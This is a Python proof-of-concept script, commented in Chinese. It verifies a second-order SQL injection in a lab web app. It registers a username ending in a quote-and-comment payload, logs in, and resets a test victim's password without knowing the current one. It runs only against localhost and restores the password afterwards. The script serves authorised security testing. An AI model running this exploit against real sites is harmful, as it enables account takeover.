#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-005 二阶 SQL 注入验证草案（未运行，需人工适配）。

仅用于本地授权教学靶场。默认只允许 localhost / 127.0.0.1 / ::1。
数据流假设（须由目标部署确认）：
  new_user.php 写入 users -> 登录把 users.username 返回并放入 SESSION
  -> 改密页面用 SESSION.username 无转义拼接 UPDATE。
演示不触碰 admin 或既有记录，使用两个专用测试账号：
  V     受害测试账号，口令已知
  V'#   攻击者用户名；登录后 SESSION.username 即 V'#
以错误的 current_password 提交改密；若 V 的口令被改，说明
username='$username' and password='$curr_pass' 中的口令条件被 # 注释掉。
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = ("localhost", "127.0.0.1", "::1")


def check_base(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("基址必须使用 http:// 或 https://")
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("默认仅允许 localhost/127.0.0.1/::1；其他已授权地址需单独记录并修改本检查")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """禁止自动跟随 3xx，保留 Location 供判定。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class LabClient:
    """最小 HTTP 客户端：手工保存 Cookie，不跟随重定向。"""

    def __init__(self, base, timeout=10.0, insecure_tls=False):
        check_base(base)
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.cookies = {}
        handlers = [NoRedirect()]
        if insecure_tls:
            import ssl

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=context))
        self.opener = urllib.request.build_opener(*handlers)

    def _url(self, path):
        return self.base + "/" + path.lstrip("/")

    def _absorb_cookies(self, headers):
        for raw in headers.get_all("Set-Cookie") or []:
            first = raw.split(";", 1)[0].strip()
            if "=" in first:
                name, value = first.split("=", 1)
                self.cookies[name.strip()] = value.strip()

    def post(self, path, fields):
        payload = urllib.parse.urlencode(fields).encode("utf-8")
        request = urllib.request.Request(
            self._url(path),
            data=payload,
            method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "sqli005-poc/0.1 (local-lab only)",
                "Accept": "text/html",
            },
        )
        if self.cookies:
            request.add_header(
                "Cookie", "; ".join(k + "=" + v for k, v in self.cookies.items())
            )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                body = response.read().decode("utf-8", "replace")
                self._absorb_cookies(response.headers)
                return response.status, response.headers, body
        except urllib.error.HTTPError as error:
            body = error.read().decode("utf-8", "replace")
            self._absorb_cookies(error.headers)
            return error.code, error.headers, body


def header_value(headers, name):
    value = headers.get(name)
    return value if value else ""


def register(client, path, username, password, repassword):
    status, headers, body = client.post(
        path,
        {
            "submit": "1",
            "username": username,
            "password": password,
            "re_password": repassword,
        },
    )
    lowered = body.lower()
    return {
        "status": status,
        "location": header_value(headers, "Location"),
        "already_exists": "already exists" in lowered,
        "created_marker": "user-created" in lowered
        or "redirecting you to login page" in lowered,
    }


def login(client, path, login_user, login_password):
    status, headers, body = client.post(
        path, {"login_user": login_user, "login_password": login_password}
    )
    location = header_value(headers, "Location")
    return {
        "status": status,
        "location": location,
        "auth_cookie": "Auth" in client.cookies,
        "session_cookie": any(
            name.upper().startswith("PHPSESSID") for name in client.cookies
        ),
        "ok": location.endswith("logged-in.php"),
    }


def change_password(client, path, current_password, new_password):
    status, headers, body = client.post(
        path,
        {
            "submit": "1",
            "current_password": current_password,
            "password": new_password,
            "re_password": new_password,
        },
    )
    return {
        "status": status,
        "location": header_value(headers, "Location"),
        "updated_marker": "Password successfully updated" in body,
    }


def main():
    parser = argparse.ArgumentParser(
        description="SQLI-005 二阶 SQL 注入验证草案（仅本地授权靶场）"
    )
    parser.add_argument("--base", required=True, help="靶场基址，例如 http://127.0.0.1:8080")
    parser.add_argument(
        "--register-path",
        default="new_user.php",
        help="注册页面路径；片段中由 refresh url=new_user.php 给出",
    )
    parser.add_argument(
        "--login-path", required=True, help="登录处理入口；片段未给出文件名，须按部署填写"
    )
    parser.add_argument(
        "--change-path", required=True, help="改密页面路径；片段未给出文件名，须按部署填写"
    )
    parser.add_argument("--victim", default="sqli005victim", help="专用受害测试账号")
    parser.add_argument("--victim-password", default="VictimPass001", help="受害账号初始口令")
    parser.add_argument(
        "--attacker-password", default="AttackerPass001", help="攻击者账号口令"
    )
    parser.add_argument(
        "--new-password", default="VictimPass002", help="注入成功后写入受害账号的新口令"
    )
    parser.add_argument("--timeout", type=float, default=10.0, help="请求超时秒数")
    parser.add_argument("--insecure-tls", action="store_true", help="仅本地自签证书时使用")
    parser.add_argument("--no-restore", action="store_true", help="跳过受害账号口令恢复")
    parser.add_argument(
        "--report", default=None, help="可选：脱敏结果 JSON 路径（不含 Cookie 与口令）"
    )
    args = parser.parse_args()

    attacker_name = args.victim + "'#"
    report = {
        "base": args.base,
        "victim": args.victim,
        "attacker": attacker_name,
        "steps": {},
    }

    registrar = LabClient(args.base, args.timeout, args.insecure_tls)
    registered_victim = register(
        registrar,
        args.register_path,
        args.victim,
        args.victim_password,
        args.victim_password,
    )
    report["steps"]["register_victim"] = registered_victim
    if registered_victim["already_exists"] or not registered_victim["created_marker"]:
        raise SystemExit(
            "受害测试账号已存在或注册未按预期完成；请换干净的专用账号："
            + str(registered_victim)
        )

    registered_attacker = register(
        registrar,
        args.register_path,
        attacker_name,
        args.attacker_password,
        args.attacker_password,
    )
    report["steps"]["register_attacker"] = registered_attacker
    if registered_attacker["already_exists"] or not registered_attacker["created_marker"]:
        raise SystemExit("攻击者测试账号已存在或注册未按预期完成：" + str(registered_attacker))

    victim_client = LabClient(args.base, args.timeout, args.insecure_tls)
    victim_login = login(victim_client, args.login_path, args.victim, args.victim_password)
    report["steps"]["victim_login_initial"] = victim_login
    if not victim_login["ok"]:
        raise SystemExit(
            "受害账号初始登录未成功；请检查登录路径、口令与 output_buffering："
            + str(victim_login)
        )

    control = change_password(
        victim_client, args.change_path, "WrongCurrentPass", args.new_password
    )
    report["steps"]["control_wrong_current_password"] = control
    control_old = login(
        LabClient(args.base, args.timeout, args.insecure_tls),
        args.login_path,
        args.victim,
        args.victim_password,
    )
    report["steps"]["control_victim_old_password"] = control_old
    report["control_ok"] = bool(not control["updated_marker"] and control_old["ok"])

    attacker_client = LabClient(args.base, args.timeout, args.insecure_tls)
    attacker_login = login(
        attacker_client, args.login_path, attacker_name, args.attacker_password
    )
    report["steps"]["attacker_login"] = attacker_login
    if not attacker_login["ok"]:
        raise SystemExit(
            "攻击者用户名登录失败，注入载荷未能进入 SESSION：" + str(attacker_login)
        )

    injected = change_password(
        attacker_client, args.change_path, "WrongCurrentPass", args.new_password
    )
    report["steps"]["injected_change_password"] = injected

    victim_new = login(
        LabClient(args.base, args.timeout, args.insecure_tls),
        args.login_path,
        args.victim,
        args.new_password,
    )
    report["steps"]["verify_victim_new_password"] = victim_new
    victim_old = login(
        LabClient(args.base, args.timeout, args.insecure_tls),
        args.login_path,
        args.victim,
        args.victim_password,
    )
    report["steps"]["verify_victim_old_password"] = victim_old

    report["observed_injection"] = bool(
        report["control_ok"]
        and injected["updated_marker"]
        and victim_new["ok"]
        and not victim_old["ok"]
    )

    if not args.no_restore:
        restore_client = LabClient(args.base, args.timeout, args.insecure_tls)
        restore_login = login(
            restore_client, args.login_path, args.victim, args.new_password
        )
        report["steps"]["restore_login"] = restore_login
        if restore_login["ok"]:
            restore = change_password(
                restore_client,
                args.change_path,
                args.new_password,
                args.victim_password,
            )
            report["steps"]["restore_change"] = restore
            restored = login(
                LabClient(args.base, args.timeout, args.insecure_tls),
                args.login_path,
                args.victim,
                args.victim_password,
            )
            report["steps"]["verify_restore"] = restored
            report["restored"] = bool(restore["updated_marker"] and restored["ok"])

    print(json.dumps(report, ensure_ascii=False, indent=2))
    if args.report:
        with open(args.report, "w", encoding="utf-8") as handle:
            json.dump(report, handle, ensure_ascii=False, indent=2)
    print()
    print(
        "判定提示：仅当对照步骤无更新标记、注入步骤出现更新标记、且受害账号新口令可登录而旧口令不可登录时，"
        "才支持所报数据流；HTTP 200 或单次响应标记本身不构成结论。",
        file=sys.stderr,
    )
    if not report["observed_injection"]:
        sys.exit(2)


if __name__ == "__main__":
    main()
